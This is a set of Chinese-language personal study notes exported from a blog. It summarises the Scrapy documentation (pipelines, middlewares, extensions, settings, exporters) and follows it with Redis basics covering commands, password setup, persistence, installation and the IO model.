有时候，您可能会注意到Scrapy进程的内存占用只在增长，从不下降。不幸的是， 有时候这并不是Scrapy或者您的项目在泄露内存。这是由于一个已知(但不有名)的Python问题。 Python在某些情况下可能不会返回已经释放的内存到操作系统。 下载项目图片 Scrapy提供了一个 item pipeline ，来下载属于某个特定项目的图片，比如，当你抓取产品时，也想把它们的图片下载到本地。 这条管道，被称作图片管道，在 ImagesPipeline 类中实现，提供了一个方便并具有额外特性的方法，来下载并本地存储图片: Pillow 是用来生成缩略图，并将图片归一化为JPEG/RGB格式，因此为了使用图片管道，你需要安装这个库。 使用样例 为了使用图片管道，你仅需要 启动它 并用 image_urls 和 images 定义一个项目: import scrapy class MyItem(scrapy.Item): # ... other item fields ... image_urls = scrapy.Field() images = scrapy.Field() 开启你的图片管道 为了开启你的图片管道，你首先需要在项目中添加它 ITEM_PIPELINES setting: ITEM_PIPELINES = {&apos;scrapy.contrib.pipeline.images.ImagesPipeline&apos;: 1} 并将 IMAGES_STORE 设置为一个有效的文件夹，用来存储下载的图片。 比如: IMAGES_STORE = &apos;/path/to/valid/dir&apos; 图片失效 图像管道避免下载最近已经下载的图片。使用 IMAGES_EXPIRES 设置可以调整失效期限，可以用天数来指定: # 90天的图片失效期限 IMAGES_EXPIRES = 90 缩略图生成 图片管道可以自动创建下载图片的缩略图。 为了使用这个特性，你需要设置 IMAGES_THUMBS 字典，其关键字为缩略图名字，值为它们的大小尺寸。 比如: IMAGES_THUMBS = { &apos;small&apos;: (50, 50), &apos;big&apos;: (270, 270), } &lt;size_name&gt; 是 IMAGES_THUMBS 字典关键字（small， big ，等） &lt;image_id&gt; 是图像url的 SHA1 hash 滤出小图片 你可以丢掉那些过小的图片，只需在:setting:IMAGES_MIN_HEIGHT 和 IMAGES_MIN_WIDTH 设置中指定最小允许的尺寸。 比如: IMAGES_MIN_HEIGHT = 110 IMAGES_MIN_WIDTH = 110 实现定制图片管道 在工作流程中可以看到，管道会得到图片的URL并从项目中下载。为了这么做，你需要重写 get_media_requests() 方法，并对各个图片URL返回一个Request: def get_media_requests(self, item, info): for image_url in item[&apos;image_urls&apos;]: yield scrapy.Request(image_url) 这些请求将被管道处理，当它们完成下载后，结果将以2-元素的元组列表形式传送到 item_completed() 方法 当一个单独项目中的所有图片请求完成时（要么完成下载，要么因为某种原因下载失败）， ImagesPipeline.item_completed() 方法将被调用。 item_completed() 方法需要返回一个输出，其将被送到随后的项目管道阶段，因此你需要返回（或者丢弃）项目，如你在任意管道里所做的一样。 reg：如果其中没有图片，我们将丢弃项目: from scrapy.exceptions import DropItem def item_completed(self, results, item, info): image_paths = [x[&apos;path&apos;] for ok, x in results if ok] if not image_paths: raise DropItem(&quot;Item contains no images&quot;) item[&apos;image_paths&apos;] = image_paths return item 定制图片管道的例子 下面是一个图片管道的完整例子: import scrapy from scrapy.contrib.pipeline.images import ImagesPipeline from scrapy.exceptions import DropItem class MyImagesPipeline(ImagesPipeline): def get_media_requests(self, item, info): for image_url in item[&apos;image_urls&apos;]: yield scrapy.Request(image_url) def item_completed(self, results, item, info): image_paths = [x[&apos;path&apos;] for ok, x in results if ok] if not image_paths: raise DropItem(&quot;Item contains no images&quot;) item[&apos;image_paths&apos;] = image_paths return item Ubuntu 软件包 把Scrapy签名的GPG密钥添加到APT的钥匙环中: sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 627220E7 执行如下命令，创建 /etc/apt/sources.list.d/scrapy.list 文件: echo &apos;deb http://archive.scrapy.org/ubuntu scrapy main&apos; | sudo tee /etc/apt/sources.list.d/scrapy.list 更新包列表并安装 scrapy-0.24: sudo apt-get update &amp;&amp; sudo apt-get install scrapy-0.24 自动限速(AutoThrottle)扩展 该扩展能根据Scrapy服务器及您爬取的网站的负载自动限制爬取速度。 在Scrapy中，下载延迟是通过计算建立TCP连接到接收到HTTP包头(header)之间的时间来测量的。 限速算法 算法根据以下规则调整下载延迟及并发数: spider永远以1并发请求数及 AUTOTHROTTLE_START_DELAY 中指定的下载延迟启动。 当接收到回复时，下载延迟会调整到该回复的延迟与之前下载延迟之间的平均值。 AutoThrottle扩展尊重标准Scrapy设置中的并发数及延迟。这意味着其永远不会设置一个比 DOWNLOAD_DELAY 更低的下载延迟或者比 CONCURRENT_REQUESTS_PER_DOMAIN 更高的并发数 (或 CONCURRENT_REQUESTS_PER_IP ，取决于您使用哪一个)。 Benchmarking（基准测试） Scrapy提供了一个简单的性能测试工具。其创建了一个本地HTTP服务器，并以最大可能的速度进行爬取。 该测试性能工具目的是测试Scrapy在您的硬件上的效率，来获得一个基本的底线用于对比。 其使用了一个简单的spider，仅跟进链接，不做任何处理。 scrapy bench Jobs: 暂停，恢复爬虫 Scrapy通过如下工具支持这个功能: 一个把调度请求保存在磁盘的调度器 一个把访问请求保存在磁盘的副本过滤器[duplicates filter] 一个能持续保持爬虫状态(键/值对)的扩展 要启用持久化支持，你只需要通过 JOBDIR 设置 job directory 选项。这个路径将会存储 所有的请求数据来保持一个单独任务的状态(例如：一次spider爬取(a spider run))。 要启用一个爬虫的持久化，运行以下命令: scrapy crawl somespider -s JOBDIR=crawls/somespider-1 然后，你就能在任何时候安全地停止爬虫(按Ctrl-C或者发送一个信号)。恢复这个爬虫也是同样的命令: scrapy crawl somespider -s JOBDIR=crawls/somespider-1 保持状态 有的时候，你希望持续保持一些运行长时间的蜘蛛的状态。这时您可以使用 spider.state 属性, 请求序列化 请求是由 pickle 进行序列化的，所以你需要确保你的请求是可被pickle序列化的。 这里最常见的问题是在在request回调函数中使用 lambda 方法，导致无法序列化。 DjangoItem DjangoItem 是一个item的类，其从Django模型中获取字段(field)定义。 创造一个Django模型: from django.db import models class Person(models.Model): name = models.CharField(max_length=255) age = models.IntegerField() 定义一个基本的 DjangoItem: from scrapy.contrib.djangoitem import DjangoItem class PersonItem(DjangoItem): django_model = Person DjangoItem 的使用方法和 Item 类似: &gt;&gt;&gt; p = PersonItem() &gt;&gt;&gt; p[&apos;name&apos;] = &apos;John&apos; &gt;&gt;&gt; p[&apos;age&apos;] = &apos;22&apos; 要从item中获取Django模型，调用 DjangoItem 中额外的方法 save(): &gt;&gt;&gt; person = p.save() &gt;&gt;&gt; person.name &apos;John&apos; &gt;&gt;&gt; person.age &apos;22&apos; &gt;&gt;&gt; person.id 1 当我们调用 save() 时，模型已经保存了。我们可以在调用时带上 commit=False 来避免保存， 并获取到一个未保存的模型: &gt;&gt;&gt; person = p.save(commit=False) &gt;&gt;&gt; person.name &apos;John&apos; &gt;&gt;&gt; person.age &apos;22&apos; &gt;&gt;&gt; person.id None 配置Django的设置 在Django应用之外使用Django模型(model)，您需要设置 DJANGO_SETTINGS_MODULE 环境变量以及 –大多数情况下– 修改 PYTHONPATH 环境变量来导入设置模块。 架构概览 Scrapy Engine 引擎负责控制数据流在系统中所有组件中流动，并在相应动作发生时触发事件。 调度器(Scheduler) 调度器从引擎接受request并将他们入队，以便之后引擎请求他们时提供给引擎。 下载器(Downloader) 下载器负责获取页面数据并提供给引擎，而后提供给spider。 Spiders Spider是Scrapy用户编写用于分析response并提取item(即获取到的item)或额外跟进的URL的类。 Item Pipeline Item Pipeline负责处理被spider提取出来的item。典型的处理有清理、 验证及持久化(例如存取到数据库中)。 下载器中间件(Downloader middlewares) 下载器中间件是在引擎及下载器之间的特定钩子(specific hook)，处理Downloader传递给引擎的response。 Spider中间件(Spider middlewares) Spider中间件是在引擎及Spider之间的特定钩子(specific hook)，处理spider的输入(response)和输出(items及requests)。 数据流(Data flow) Scrapy中的数据流由执行引擎控制，其过程如下: 引擎打开一个网站(open a domain)，找到处理该网站的Spider并向该spider请求第一个要爬取的URL(s)。 引擎从Spider中获取到第一个要爬取的URL并在调度器(Scheduler)以Request调度。 引擎向调度器请求下一个要爬取的URL。 调度器返回下一个要爬取的URL给引擎，引擎将URL通过下载中间件(请求(request)方向)转发给下载器(Downloader)。 一旦页面下载完毕，下载器生成一个该页面的Response，并将其通过下载中间件(返回(response)方向)发送给引擎。 引擎从下载器中接收到Response并通过Spider中间件(输入方向)发送给Spider处理。 Spider处理Response并返回爬取到的Item及(跟进的)新的Request给引擎。 引擎将(Spider返回的)爬取到的Item给Item Pipeline，将(Spider返回的)Request给调度器。 (从第二步)重复直到调度器中没有更多地request，引擎关闭该网站。 事件驱动网络(Event-driven networking) Scrapy基于事件驱动网络框架 Twisted 编写。因此，Scrapy基于并发性考虑由非阻塞(即异步)的实现。 下载器中间件(Downloader Middleware) 下载器中间件是介于Scrapy的request/response处理的钩子框架。 是用于全局修改Scrapy request和response的一个轻量、底层的系统。 激活下载器中间件 要激活下载器中间件组件，将其加入到 DOWNLOADER_MIDDLEWARES 设置中。 该设置是一个字典(dict)，键为中间件类的路径，值为其中间件的顺序(order)。 这里是一个例子: DOWNLOADER_MIDDLEWARES = { &apos;myproject.middlewares.CustomDownloaderMiddleware&apos;: 543, } DOWNLOADER_MIDDLEWARES 设置会与Scrapy定义的 DOWNLOADER_MIDDLEWARES_BASE 设置合并(但不是覆盖)， 而后根据顺序(order)进行排序，最后得到启用中间件的有序列表: 第一个中间件是最靠近引擎的，最后一个中间件是最靠近下载器的。 编写您自己的下载器中间件 process_request(request, spider) 当每个request通过下载中间件时，该方法被调用。 process_response(request, response, spider) process_request() 必须返回以下之一: 返回一个 Response 对象、 返回一个 Request 对象或raise一个 IgnoreRequest 异常。 process_exception(request, exception, spider) 当下载处理器(download handler)或 process_request() (下载中间件)抛出异常(包括 IgnoreRequest 异常)时， Scrapy调用 process_exception() 。 内置下载中间件参考手册 CookiesMiddleware 该中间件使得爬取需要cookie(例如使用session)的网站成为了可能。 其追踪了web server发送的cookie，并在之后的request中发送回去， 就如浏览器所做的那样。 HttpCacheMiddleware 该中间件为所有HTTP request及response提供了底层(low-level)缓存支持。 其由cache存储后端及cache策略组成。 Scrapy提供了两种HTTP缓存存储后端: Filesystem storage backend (默认值) DBM storage backend Scrapy提供了两种了缓存策略: RFC2616策略 Dummy策略(默认值) Dummy策略(默认值) 该策略不考虑任何HTTP Cache-Control指令。每个request及其对应的response都被缓存。 当相同的request发生时，其不发送任何数据，直接返回response。 RFC2616策略 该策略提供了符合RFC2616的HTTP缓存，例如符合HTTP Cache-Control， 针对生产环境并且应用在持续性运行环境所设置。该策略能避免下载未修改的数据(来节省带宽，提高爬取速度)。 使用这个策略，设置: HTTPCACHE_POLICY 为 scrapy.contrib.httpcache.RFC2616Policy 。。。 Spider中间件(Middleware) Spider中间件是介入到Scrapy的spider处理机制的钩子框架，您可以添加代码来处理发送给 Spiders 的response及spider产生的item和request。 激活spider中间件 要启用spider中间件，您可以将其加入到 SPIDER_MIDDLEWARES 设置中。 该设置是一个字典，键位中间件的路径，值为中间件的顺序(order)。 样例: SPIDER_MIDDLEWARES = { &apos;myproject.middlewares.CustomSpiderMiddleware&apos;: 543, } SPIDER_MIDDLEWARES 设置会与Scrapy定义的 SPIDER_MIDDLEWARES_BASE 设置合并(但不是覆盖)， 而后根据顺序(order)进行排序，最后得到启用中间件的有序列表: 第一个中间件是最靠近引擎的，最后一个中间件是最靠近spider的。 如果您想禁止内置的(在 SPIDER_MIDDLEWARES_BASE 中设置并默认启用的)中间件， 您必须在项目的 SPIDER_MIDDLEWARES 设置中定义该中间件，并将其值赋为 None 。 例如，如果您想要关闭off-site中间件: SPIDER_MIDDLEWARES = { &apos;myproject.middlewares.CustomSpiderMiddleware&apos;: 543, &apos;scrapy.contrib.spidermiddleware.offsite.OffsiteMiddleware&apos;: None, } 编写您自己的spider中间件 process_spider_input(response, spider) 当response通过spider中间件时，该方法被调用，处理该response。 process_spider_input() 应该返回 None 或者抛出一个异常。 如果其返回 None ，Scrapy将会继续处理该response，调用所有其他的中间件直到spider处理该response。 如果其跑出一个异常(exception)，Scrapy将不会调用任何其他中间件的 process_spider_input() 方法，并调用request的errback。 errback的输出将会以另一个方向被重新输入到中间件链中，使用 process_spider_output() 方法来处理，当其抛出异常时则带调用 process_spider_exception() 。 process_spider_output(response, result, spider) 当Spider处理response返回result时，该方法被调用。 process_spider_output() 必须返回包含 Request 或 Item 对象的可迭代对象(iterable)。 process_spider_exception(response, exception, spider) 当spider或(其他spider中间件的) process_spider_input() 跑出异常时， 该方法被调用。 process_start_requests(start_requests, spider) 该方法以spider 启动的request为参数被调用，执行的过程类似于 process_spider_output() ，只不过其没有相关联的response并且必须返回request(不是item)。 其接受一个可迭代的对象(start_requests 参数)且必须返回另一个包含 Request 对象的可迭代对象。 内置spider中间件参考手册 DepthMiddleware DepthMiddleware是一个用于追踪每个Request在被爬取的网站的深度的中间件。 其可以用来限制爬取深度的最大深度或类似的事情。 HttpErrorMiddleware 过滤出所有失败(错误)的HTTP response，因此spider不需要处理这些request。 处理这些request意味着消耗更多资源，并且使得spider逻辑更为复杂。 HTTPERROR_ALLOWED_CODES 默认: [] 忽略该列表中所有非200状态码的response。 HTTPERROR_ALLOW_ALL 默认: False 忽略所有response，不管其状态值。 。。。 扩展(Extensions) 扩展设置(Extension settings) 扩展使用 Scrapy settings 管理它们的设置 通常扩展需要给它们的设置加上前缀，以避免跟已有(或将来)的扩展冲突。 比如，一个扩展处理 Google Sitemaps， 则可以使用类似 GOOGLESITEMAP_ENABLED、GOOGLESITEMAP_DEPTH 等设置。 加载和激活扩展 扩展在扩展类被实例化时加载和激活。 因此，所有扩展的实例化代码必须在类的构造函数(__init__)中执行。 要使得扩展可用，需要把它添加到Scrapy的 EXTENSIONS 配置中。 在 EXTENSIONS 中，每个扩展都使用一个字符串表示，即扩展类的全Python路径。 比如: EXTENSIONS = { &apos;scrapy.contrib.corestats.CoreStats&apos;: 500, &apos;scrapy.webservice.WebService&apos;: 500, &apos;scrapy.telnet.TelnetConsole&apos;: 500, } 扩展之间一般没有关联。 扩展加载的顺序并不重要，因为它们并不相互依赖。 [1] 这也是为什么Scrapy的配置项 EXTENSIONS_BASE (它包括了所有内置且开启的扩展)定义所有扩展的顺序都相同 (500)。 可用的(Available)、开启的(enabled)和禁用的(disabled)的扩展 禁用扩展(Disabling an extension) EXTENSIONS = { &apos;scrapy.contrib.corestats.CoreStats&apos;: None, } 实现你的扩展 Scrapy扩展(包括middlewares和pipelines)的主要入口是 from_crawler 类方法， 它接收一个 Crawler 类的实例，该实例是控制Scrapy crawler的主要对象。 通常来说，扩展关联到 signals 并执行它们触发的任务。 最后，如果 from_crawler 方法抛出 NotConfigured 异常， 扩展会被禁用。否则，扩展会被开启。 reg：该扩展会在以下事件时记录一条日志： spider被打开 spider被关闭 爬取了特定数量的条目(items) 该扩展通过 MYEXT_ENABLED 配置项开启， items的数量通过 MYEXT_ITEMCOUNT 配置项设置。 from scrapy import signals from scrapy.exceptions import NotConfigured class SpiderOpenCloseLogging(object): def __init__(self, item_count): self.item_count = item_count self.items_scraped = 0 @classmethod def from_crawler(cls, crawler): # first check if the extension should be enabled and raise # NotConfigured otherwise if not crawler.settings.getbool(&apos;MYEXT_ENABLED&apos;): raise NotConfigured # get the number of items from settings item_count = crawler.settings.getint(&apos;MYEXT_ITEMCOUNT&apos;, 1000) # instantiate the extension object ext = cls(item_count) # connect the extension object to signals crawler.signals.connect(ext.spider_opened, signal=signals.spider_opened) crawler.signals.connect(ext.spider_closed, signal=signals.spider_closed) crawler.signals.connect(ext.item_scraped, signal=signals.item_scraped) # return the extension object return ext def spider_opened(self, spider): spider.log(&quot;opened spider %s&quot; % spider.name) def spider_closed(self, spider): spider.log(&quot;closed spider %s&quot; % spider.name) def item_scraped(self, item, spider): self.items_scraped += 1 if self.items_scraped % self.item_count == 0: spider.log(&quot;scraped %d items&quot; % self.items_scraped) 内置扩展介绍 通用扩展 记录统计扩展(Log Stats extension) class scrapy.contrib.logstats.LogStats Web service 扩展 class scrapy.webservice.WebService 内存使用扩展(Memory usage extension) class scrapy.contrib.memusage.MemoryUsage 监控Scrapy进程内存使用量，并且： 如果使用内存量超过某个指定值，发送提醒邮件 如果超过某个指定值，关闭spider 该扩展通过 MEMUSAGE_ENABLED 配置项开启，可以使用以下选项： MEMUSAGE_LIMIT_MB MEMUSAGE_WARNING_MB MEMUSAGE_NOTIFY_MAIL MEMUSAGE_REPORT 内存调试扩展(Memory debugger extension) class scrapy.contrib.memdebug.MemoryDebugger 该扩展用于调试内存使用量，它收集以下信息： 没有被Python垃圾回收器收集的对象 应该被销毁却仍然存活的对象。 CLOSESPIDER_ERRORCOUNT 一个整数值，指定spider可以接受的最大错误数。 如果spider生成多于该数目的错误，它将以 closespider_errorcount 的原因关闭。 如果设置为0（或者未设置），spiders不会因为发生错误过多而关闭。 StatsMailer extension class scrapy.contrib.statsmailer.StatsMailer 这个简单的扩展可用来在一个域名爬取完毕时发送提醒邮件， 包含Scrapy收集的统计信息。 邮件会发送个通过 STATSMAILER_RCPTS 指定的所有接收人。 Debugging extensions Stack trace dump extension class scrapy.contrib.debug.StackTraceDump 当收到 SIGQUIT 或 SIGUSR2 信号，spider进程的信息将会被存储下来。 存储的信息包括： engine状态(使用 scrapy.utils.engin.get_engine_status()) 所有存活的引用(live references)(参考 使用 trackref 调试内存泄露) 所有线程的堆栈信息 当堆栈信息和engine状态存储后，Scrapy进程继续正常运行。 该扩展只在POSIX兼容的平台上可运行（比如不能在Windows运行）， 因为 SIGQUIT 和 SIGUSR2 信号在Windows上不可用。 至少有两种方式可以向Scrapy发送 SIGQUIT 信号: 在Scrapy进程运行时通过按Ctrl-(仅Linux可行?) 运行该命令(&lt;pid&gt; 是Scrapy运行的进程): kill -QUIT &lt;pid&gt; 调试扩展(Debugger extension) class scrapy.contrib.debug.Debugger 当收到 SIGUSR2 信号，将会在Scrapy进程中调用 Python debugger 。 debugger退出后，Scrapy进程继续正常运行。 核心API 目标用户是开发Scrapy扩展(extensions)和中间件(middlewares)的开发人员。 Scrapy API的主要入口是 Crawler 的实例对象， 通过类方法 from_crawler 将它传递给扩展(extensions)。 requests和response Scrapy使用Request和Response对象来抓取网站。 一个Request对象表示一个HTTP请求，它通常在Spider中生成并由Downloader执行，从而生成一个Response。 cookies (dict or list) – the request cookies. These can be sent in two forms. Using a dict: request_with_cookies = Request(url=&quot;http://www.example.com&quot;, cookies={&apos;currency&apos;: &apos;USD&apos;, &apos;country&apos;: &apos;UY&apos;}) Using a list of dicts: request_with_cookies = Request(url=&quot;http://www.example.com&quot;, cookies=[{&apos;name&apos;: &apos;currency&apos;, &apos;value&apos;: &apos;USD&apos;, &apos;domain&apos;: &apos;example.com&apos;, &apos;path&apos;: &apos;/currency&apos;}]) FormRequest对象 FormRequest类扩展了基础Request，具有处理HTML表单的功能。它使用lxml.html表单 来预先填充表单字段，其中包含来自Response对象的表单数据。 Using FormRequest to send data via HTTP POST If you want to simulate a HTML Form POST in your spider and send a couple of key-value fields, you can return a FormRequest object (from your spider) like this: return [FormRequest(url=&quot;http://www.example.com/post/action&quot;, formdata={&apos;name&apos;: &apos;John Doe&apos;, &apos;age&apos;: &apos;27&apos;}, callback=self.after_post)] 使用FormRequest.from_response()方法模拟用户登录 通常网站通过 &lt;input type=&quot;hidden&quot;&gt; 实现对某些表单字段（如数据或是登录界面中的认证令牌等）的预填充。 使用Scrapy抓取网页时，如果想要预填充或重写像用户名、用户密码这些表单字段， 可以使用 FormRequest.from_response() 方法实现。下面是使用这种方法的爬虫例子: import scrapy class LoginSpider(scrapy.Spider): name = &apos;example.com&apos; start_urls = [&apos;http://www.example.com/users/login.php&apos;] def parse(self, response): return scrapy.FormRequest.from_response( response, formdata={&apos;username&apos;: &apos;john&apos;, &apos;password&apos;: &apos;secret&apos;}, callback=self.after_login ) def after_login(self, response): # check login succeed before going on if &quot;authentication failed&quot; in response.body: self.log(&quot;Login failed&quot;, level=scrapy.log.ERROR) return # continue scraping with authenticated session... Settings Scrapy设定(settings)提供了定制Scrapy组件的方法。您可以控制包括核心(core)，插件(extension)，pipeline及spider组件。 如何访问设定(How to access settings) 设定可以通过Crawler的 scrapy.crawler.Crawler.settings 属性进行访问。其由插件及中间件的 from_crawler 方法所传入: class MyExtension(object): @classmethod def from_crawler(cls, crawler): settings = crawler.settings if settings[&apos;LOG_ENABLED&apos;]: print &quot;log is enabled!&quot; 信号(Signals) Scrapy使用信号来通知事情发生。 内置信号 reg： scrapy.signals.engine_started() 当Scrapy引擎启动爬取时发送该信号。 scrapy.signals.item_scraped(item, response, spider) 当item被爬取，并通过所有 Item Pipeline 后(没有被丢弃(dropped)，发送该信号。 scrapy.signals.response_received(response, request, spider) 当引擎从downloader获取到一个新的 Response 时发送该信号。 异常(Exceptions) 内置异常 reg： scrapy.exceptions.DropItem 该异常由item pipeline抛出，用于停止处理item。 CloseSpider 该异常由spider的回调函数(callback)抛出，来暂停/停止spider。 Item Exporters Scrapy提供了Item Exporters 来创建不同的输出格式，如XML，CSV或JSON。 在实例化了 exporter 之后，你必须： 调用方法 start_exporting() 以标识 exporting 过程的开始。 对要导出的每个项目调用 export_item() 方法。 最后调用 finish_exporting() 表示 exporting 过程的结束 序列化 1. 在 field 类中声明一个 serializer 您可以在 field metadata 声明一个 serializer。该 serializer 必须可调用，并返回它的序列化形式。 实例: import scrapy def serialize_price(value): return &apos;$ %s&apos; % str(value) class Product(scrapy.Item): name = scrapy.Field() price = scrapy.Field(serializer=serialize_price) 2. 覆盖(overriding) serialize_field() 方法 你可以覆盖 serialize_field() 方法来自定义如何输出你的数据。 在你的自定义代码后确保你调用父类的 serialize_field() 方法。 实例: from scrapy.contrib.exporter import XmlItemExporter class ProductXmlExporter(XmlItemExporter): def serialize_field(self, field, name, value): if field == &apos;price&apos;: return &apos;$ %s&apos; % str(value) return super(Product, self).serialize_field(field, name, value) Item Exporters 这是一个对所有 Item Exporters 的(抽象)父类。它对所有(具体) Item Exporters 提供基本属性，如定义export什么fields, 是否export空fields, 或是否进行编码。 XmlItemExporter 以XML格式 exports Items 到指定的文件类. CsvItemExporter 输出 csv 文件格式. 如果添加 fields_to_export 属性, 它会按顺序定义CSV的列名. JsonItemExporter 输出 JSON 文件格式, JsonLinesItemExporter 输出 JSON 文件格式, 每行写一个 JSON-encoded 项.这个类能很好的处理大量数据.]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>框架</category>
        <category>scrapy</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>爬虫</tag>
        <tag>scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2FRedis%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[Redis是什么？ REmote Dictionary Server（Redis）是一个由Salvatore Sanfilippo写的key-value存储系统。 优点： 能支持超过100K+每秒的读写频率。 安装： 实验楼（省略） 使用： Sudo service reds-server start redis-cli &gt;set mykey somevalue &gt;get mykey 可以用set和get来创建和检索strings 可以对已有的key重新赋值： &gt;set mykey newval nx &gt;set mykey newval xx 加法器： &gt;set counter 100 &gt;incr counter。 加1 &gt;incr counter &gt;incrby counter 50. 加50 使用mset和mget完成一次性多个key-value对应关系： &gt;mset a 10 b 20 c 30 &gt;mget a b c Push一类命令返回值为list的长度： &gt;rpush mylist A &gt;rpush mylist B &gt;lpush mylist first &gt;lrange mylist 0 -1 rpush为添加xx元素 Lrange里面的0表示list开头第一个，-1表示list倒数第一个，lrange为查看list元素 &gt;rpush mylist 1 2 3 4 5 “foo bar” &gt;lrange mylist 0 -1 pop命令： &gt;del mylist &gt;rpush mylist a b c. &gt;rpop mylist 取出mylist最右边的元素 &gt;lrange mylist 0 -1 &gt;lpop mylist &gt;lrange mylist 0 -1 redis hashes存储： &gt;hmset user:1000 username antirez birthyear 1977 verified 1 &gt;hget user:1000 username &gt;hget user:1000 birthyear &gt;hgetall user:1000 &gt;hmget user:1000 username birthyear no-such-vield hash加法： &gt;hincrby user:1000 birthyear 10 sadd命令产生一个无序集合，返回集合元素个数，smembers用于查看集合 &gt;sadd myset 1 2 3 &gt;smembers myset sismember用于查看集合是否存在以及元素是否存储，匹配成功返回1，失败返回0 zadd是添加有序集合，zrange正序查看，zrevrange是反序查看 &gt;zadd hackers 1940 &quot;Alan Kay&quot; &gt;zadd hackers 1957 &quot;Sophie Wilson&quot; &gt;zadd hackers 1953 &quot;Richard Stallman&quot; &gt;zrange hackers 0 -1 &gt;zrevrange hackers 0 -1 使用withscores参数返回记录值 &gt;zrange hackers 0 -1 withscores ):exists和del &gt;set mykey hello &gt;exists mykey &gt;del mykey &gt;exists mykey ):type and keys type查看value的类型，没有则返回none，keys查看key列表 &gt;set mykey x &gt;type mykey &gt;keys my* &gt;del mykey &gt;keys my* &gt;type mykey ):randomkey and clear ): rename and renamenx &gt;rename mylist newlist ):dbsize 返回当前数据库的key总数 ）：expire。限制key生存时间，单位秒 &gt;set key some-value &gt;expire key 10 &gt;get key &gt;get key. 10m后执行时，值已不存在 ）：限时操作可以在set命令中实现，ttl查询key的剩余生存时间 &gt;set key 100 ex 30. (30秒) &gt;ttl key &gt;ttl key ):flushdb:清空当前数据库中的所有键 ):flushall：清空所有数据库中的所有键 ）：config get and config set config get：用于读取运行redis服务器的配置参数 config set：用于更改运行redis服务器的配置参数 auth：认证密码 &gt;config get requirepass (查看密码) &gt;config set requirepass test123 (设置密码) &gt;config get requirepass (报错，没有认证) &gt;auth test123 &gt;config get requirepass 查询数据类型的最大条目： &gt;config get *max-*-entries* config resetstat:重置数据统计报告 ):info查询redis的相关信息 reg: &gt;info keyspace &gt;info server &gt;info cpu ）：设置密码 grep -n requirepass /etc/redis/redis.conf sudo vim /etc/redis/redis.conf 将# requirepass foobared 改为. requirepass test123 即可 ）：重启redis-server与密码验证 sudo service redis-server restart redis-cli &gt;info &gt;auth test123 &gt;info 第二种方式： redis-cli -a test123 &gt;info ）：redis事务处理，exec顺序执行队列中的命令 &gt;multi （进入事务） &gt;set name a &gt;set name b &gt;exec &gt;get name ）：持久化机制 1.快照。默认方式 2.aof save 300 10 #300秒内如果超过10个key被修改，则快照保存 配置文件中的可配置参数: appendonly yes //启用aof持久化方式 #appendfsync always //收到写命令就立即写入磁盘，最慢，但是保证了数据的完整持久化 appendfsync everysec。//每秒钟写入磁盘一次，在性能和持久化方面做了很好的折中 #appendfsync no。//完全依赖os，性能最好，持久化没有保证 &gt;help save &gt;save ======================= redis系统版 redis 01。 1.介绍 1.1 redis是什么 redis是完全开源免费的，遵守BSD协议，是一个高性能的key-value数据库。 1.2redis主要特点 支持数据的持久化，可以讲内存中的数据保存在磁盘中，重启的时候自动再次加载进行使用 既支持key-value类型的数据操作，还提供list，set，zset，hash等数据结构的存储 支持数据的备份，采用master-slave模式的主从备份。 性能极高-redis能读的速度是11万次/s，写的速度是8万次/s。 所有操作均为原子性操作 丰富的实用特性，如订阅-发布模式，生产者消费者模式，key过期等常用易用的模式 1.3竞品组件 MemoryCache-kv🌟缓存数据库：单进程多线程模型 Apache Ignite-分布式关系型缓存数据库 SSDB-kv型缓存数据库 2.redis安装与基本操作 windows安装 资源链接入口地址：https://github.com/MicrosoftArchive/redis/releases 下载导航-选择2.8.x版本均可 下载完成解压即可完成 开启服务 cmd进入对应目录后，找到服务命令-redis-server.exe，至少设置maxheap后即可运行，如设置最大可展256M内存，则对应的字节为268435456=256*1024KB*1024B redis-server.exe --mapheap 268435456 通过配置文件启动服务 修改redis.windows.conf中的maxheap参数值为268435456 redis客户端链接redis服务器 cmd进入对应目录后，找到服务命令redis-cli.exe 直接运行即可，默认链接127.0.0.1 6579端口 或者自己指定ip ，port redis-cli.exe -h 127.0.0.1 -p 6379 linux安装 资源入口链接-http://download.redis.io/releases/ 下载导航-选择2.8.x版本均可 下载地址为:http://download.redis.io/releases/redis-2.8.24.tar.gz 通过浏览器直接打开，或者wget均可 下载完成后，直接解压为源码包，需要编译后方可使用 编译过程与server运行 tar -xzvf redis-2.8.24.tar.gz cd redis-2.8.24 make cd src ./redis-server 或者./redis-server ../redis.conf //按指定的参数文件来启动redis-server，参数文件配置等同widows的conf文件 查看端口：lsof -i:6379 or. ll /proc/24482. or. ps aux|grep redis maxmemory. 为最大内存。 默认是电脑的最大内存 客户端链接server cd src ./redis-cli redis不同版本之间的互联： window的redis-cli链接linux-redis server bat脚本语言（win）：（linux是shell） auto_startserver.bat: redis-server.exe redis.windows.conf auto_startclient.bat: redis-cli.exe -h 127.0.0.1 -p 6379 3. redis重要说明 3.1 redis架构设计说明 单进程单线程模型的KV数据库 多线程处理可能涉及到锁 多线程处理会涉及到线程切换而消耗CPU 无法发挥多核CPU性能，不过可以通过在单机开多个redis实例来完善 完全基于内存 数据结构简单，对数据操作也简单 使用多路I/O复用模型（网络io事件模型-epoll） 网络IO都是通过socket实现，server在某一个端口持续监听，客户端通过socket（IP+port）与 服务器建立连接 （serversocket.accept），成功建立连接之后，就可以使用socket中封装的InputStream和OutputStream进行IO交互了。 针对每个客户端，Server都会创建一个新线程专门用于处理 默认情况下，网络IO是阻塞模式，即服务器线程在数据到来之前处于阻塞状态，等到数据到达，会自动唤醒服务器线程，着手进行处理。阻塞模式下，一个线程只能处理一个流的IO事件 5种网络IO模型。 （单线程的数据最好是要精简） 阻塞IO，非阻塞IO，IO复用模型，信号驱动IO，异步IO模型 IO复用模型中包括：select模式，poll模式，epoll模式（event poll模式），其中epoll是select和poll模型的升级优化，使得一个线程可以最大限度，最高效的监听和响应更多路客户端的IO请求 3.2 redis持久化重要说明 redis数据存储模式只有两种 cache-only 只做为“缓存”服务，数据均在内存中，不持久化数据，服务停掉则数据全部丢失，且无恢复方法，高速但安全性低 persistence 数据不只是在内存中，还会以配置的持久化方式持久化到磁盘中，保证服务停止后数据还可以恢复 持久化方式选择 RDB：默认 